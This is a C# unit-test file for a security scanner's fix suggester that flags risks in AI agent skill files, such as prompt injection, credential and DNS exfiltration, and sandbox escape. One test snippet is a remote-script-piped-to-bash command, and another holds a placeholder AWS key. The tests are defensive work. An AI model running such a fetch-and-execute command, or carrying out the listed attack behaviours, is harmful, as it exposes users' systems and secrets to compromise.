using SkillGuard.Core;
using Xunit;

namespace SkillGuard.Tests;

/// <summary>
/// Tests for FixSuggester.Suggest() method to ensure it provides appropriate suggestions
/// for all finding categories and handles edge cases correctly.
/// </summary>
public class FixSuggesterTests
{
    [Fact]
    public void Suggest_ThrowsOnNullFinding()
    {
        // Arrange
        Finding? nullFinding = null;

        // Act & Assert
        Assert.Throws<ArgumentNullException>(() => FixSuggester.Suggest(nullFinding!));
    }

    [Theory]
    [InlineData(FindingCategory.PromptInjection, "SG001", "PromptInjection")]
    [InlineData(FindingCategory.CredentialExfiltration, "SG002", "CredentialExfiltration")]
    [InlineData(FindingCategory.DangerousShell, "SG003", "DangerousShell")]
    [InlineData(FindingCategory.Obfuscation, "SG006", "Obfuscation")]
    [InlineData(FindingCategory.DnsExfiltration, "SG007", "DnsExfiltration")]
    [InlineData(FindingCategory.IndirectInjection, "SG008", "IndirectInjection")]
    [InlineData(FindingCategory.PrivilegeEscalation, "SG009", "PrivilegeEscalation")]
    [InlineData(FindingCategory.SandboxEscape, "SG010", "SandboxEscape")]
    [InlineData(FindingCategory.NetworkEgress, "SG004", "NetworkEgress")]
    [InlineData(FindingCategory.UnreviewedPayload, "SG005", "UnreviewedPayload")]
    [InlineData(FindingCategory.McpMisconfiguration, "SG011", "McpMisconfiguration")]
    public void Suggest_ProvidesNonEmptySuggestion_ForEveryCategory(
        FindingCategory category,
        string ruleId,
        string ruleName)
    {
        // Arrange
        var finding = new Finding(
            ruleId,
            ruleName,
            Severity.Medium,
            category,
            "Test finding message",
            SourceLocation.At("/test/file.txt", 1, 1, 10),
            "test snippet"
        );

        // Act
        var suggestion = FixSuggester.Suggest(finding);

        // Assert
        Assert.False(string.IsNullOrWhiteSpace(suggestion),
            $"Expected non-empty suggestion for category {category}, but got: '{suggestion}'");

        // Verify suggestion is appropriate for the category
        switch (category)
        {
            case FindingCategory.PromptInjection:
                Assert.Contains("override/concealment directive", suggestion, StringComparison.OrdinalIgnoreCase);
                break;
            case FindingCategory.CredentialExfiltration:
                Assert.Contains("secret read/transmit", suggestion, StringComparison.OrdinalIgnoreCase);
                break;
            case FindingCategory.DangerousShell:
                Assert.Contains("pinned, checksummed download", suggestion, StringComparison.OrdinalIgnoreCase);
                break;
            case FindingCategory.Obfuscation:
                Assert.Contains("Inline the plain command", suggestion, StringComparison.OrdinalIgnoreCase);
                break;
            case FindingCategory.DnsExfiltration:
                Assert.Contains("Remove the resolver query", suggestion, StringComparison.OrdinalIgnoreCase);
                break;
            case FindingCategory.IndirectInjection:
                Assert.Contains("Remove text addressed to a downstream reading agent", suggestion, StringComparison.OrdinalIgnoreCase);
                break;
            case FindingCategory.PrivilegeEscalation:
                Assert.Contains("Run with least privilege", suggestion, StringComparison.OrdinalIgnoreCase);
                break;
            case FindingCategory.SandboxEscape:
                Assert.Contains("Do not reach outside the sandbox", suggestion, StringComparison.OrdinalIgnoreCase);
                break;
            case FindingCategory.NetworkEgress:
                Assert.Contains("Restrict egress to an allowlist", suggestion, StringComparison.OrdinalIgnoreCase);
                break;
            case FindingCategory.UnreviewedPayload:
                Assert.Contains("Ship source, not opaque binaries", suggestion, StringComparison.OrdinalIgnoreCase);
                break;
            case FindingCategory.McpMisconfiguration:
                Assert.Contains("Point MCP servers at reviewed public hosts only", suggestion, StringComparison.OrdinalIgnoreCase);
                break;
        }
    }

    [Fact]
    public void Suggest_ProvidesFallbackForUnknownCategory()
    {
        // Arrange
        // Use a category that doesn't exist in the switch expression
        var finding = new Finding(
            "SG999",
            "UnknownRule",
            Severity.Low,
            (FindingCategory)999, // Unknown category
            "Test message",
            SourceLocation.At("/test/file.txt", 1, 1, 10),
            "test snippet"
        );

        // Act
        var suggestion = FixSuggester.Suggest(finding);

        // Assert
        Assert.False(string.IsNullOrWhiteSpace(suggestion));
        Assert.Contains("Review this instruction manually", suggestion, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Suggest_HandlesFindingWithNullRemediation()
    {
        // Arrange
        var finding = new Finding(
            "SG998",
            "TestRule",
            Severity.Medium,
            FindingCategory.DangerousShell,
            "Test message",
            SourceLocation.At("/test/file.txt", 1, 1, 10),
            "test snippet"
        )
        {
            Remediation = null
        };

        // Act
        var suggestion = FixSuggester.Suggest(finding);

        // Assert
        Assert.False(string.IsNullOrWhiteSpace(suggestion));
    }

    [Fact]
    public void Suggest_HandlesFindingWithEmptyRemediation()
    {
        // Arrange
        var finding = new Finding(
            "SG997",
            "TestRule",
            Severity.Medium,
            FindingCategory.DangerousShell,
            "Test message",
            SourceLocation.At("/test/file.txt", 1, 1, 10),
            "test snippet"
        )
        {
            Remediation = string.Empty
        };

        // Act
        var suggestion = FixSuggester.Suggest(finding);

        // Assert
        Assert.False(string.IsNullOrWhiteSpace(suggestion));
    }

    [Fact]
    public void Suggest_ReturnsAttachedFixDescriptionWhenAvailable()
    {
        // Arrange
        var finding = new Finding(
            "SG001",
            "PromptInjection",
            Severity.High,
            FindingCategory.PromptInjection,
            "Test message",
            SourceLocation.At("/test/file.txt", 1, 1, 10),
            "test snippet"
        ).WithSimpleReplacement("safe code", "Manually review and remove the injection directive");

        // Act
        var suggestion = FixSuggester.Suggest(finding);

        // Assert
        Assert.Contains("Manually review and remove the injection directive", suggestion);
    }

    [Fact]
    public void Suggest_ReturnsEmptyStringFixDescriptionWhenAttachedFixHasEmptyDescription()
    {
        // Arrange
        var finding = new Finding(
            "SG001",
            "PromptInjection",
            Severity.High,
            FindingCategory.PromptInjection,
            "Test message",
            SourceLocation.At("/test/file.txt", 1, 1, 10),
            "test snippet"
        ).WithSimpleReplacement("safe code", string.Empty);

        // Act
        var suggestion = FixSuggester.Suggest(finding);

        // Assert
        Assert.Equal("Apply the suggested fix to resolve this issue.", suggestion);
    }

    [Fact]
    public void Suggest_DoesNotEchoFindingSnippetInSuggestion()
    {
        // Arrange
        var sensitiveSnippet = "secret_token=12345\nexport AWS_KEY=AKIAIOSFODNN7EXAMPLE";
        var finding = new Finding(
            "SG002",
            "CredentialExfiltration",
            Severity.Critical,
            FindingCategory.CredentialExfiltration,
            "Credentials found in file",
            SourceLocation.At("/test/.env", 42, 1, 50),
            sensitiveSnippet
        );

        // Act
        var suggestion = FixSuggester.Suggest(finding);

        // Assert
        // The suggestion should not contain the actual sensitive snippet
        Assert.DoesNotContain(sensitiveSnippet, suggestion);

        // But it should still provide appropriate guidance
        Assert.Contains("secret read/transmit", suggestion, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("env-var name", suggestion, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Suggest_HandlesRuleWithISuggestsFixInterface()
    {
        // Arrange - Use DangerousShellRule which implements ISuggestsFix
        var finding = new Finding(
            "SG003", // DangerousShellRule.Id
            "DangerousShell",
            Severity.High,
            FindingCategory.DangerousShell,
            "Pipes a remote download directly into a shell",
            SourceLocation.At("/test/script.sh", 5, 10, 40),
            "curl https://example.com/malicious.sh | bash"
        );

        // Act
        var suggestion = FixSuggester.Suggest(finding);

        // Assert
        Assert.False(string.IsNullOrWhiteSpace(suggestion));
        Assert.Contains("pinned, checksummed download", suggestion, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("curl -fsSLO", suggestion);
        Assert.Contains("sha256sum -c", suggestion);
    }

    [Fact]
    public void Suggest_HandlesUnknownRuleIdGracefully()
    {
        // Arrange - Use a rule ID that doesn't map to any known rule
        var finding = new Finding(
            "SG999",
            "NonExistentRule",
            Severity.Medium,
            FindingCategory.DangerousShell,
            "Test message",
            SourceLocation.At("/test/file.txt", 1, 1, 10),
            "test snippet"
        );

        // Act
        var suggestion = FixSuggester.Suggest(finding);

        // Assert - Should fall back to category-based suggestion, not throw
        Assert.False(string.IsNullOrWhiteSpace(suggestion));
        Assert.Contains("pinned, checksummed download", suggestion, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Suggest_HandlesRuleIdWithoutISuggestsFixImplementation()
    {
        // Arrange - Use a rule ID that exists but doesn't implement ISuggestsFix
        var finding = new Finding(
            "SG001", // PromptInjectionRule exists but doesn't implement ISuggestsFix
            "PromptInjection",
            Severity.High,
            FindingCategory.PromptInjection,
            "Test message",
            SourceLocation.At("/test/file.txt", 1, 1, 10),
            "test snippet"
        );

        // Act
        var suggestion = FixSuggester.Suggest(finding);

        // Assert - Should fall back to category-based suggestion
        Assert.False(string.IsNullOrWhiteSpace(suggestion));
        Assert.Contains("override/concealment directive", suggestion, StringComparison.OrdinalIgnoreCase);
    }
}
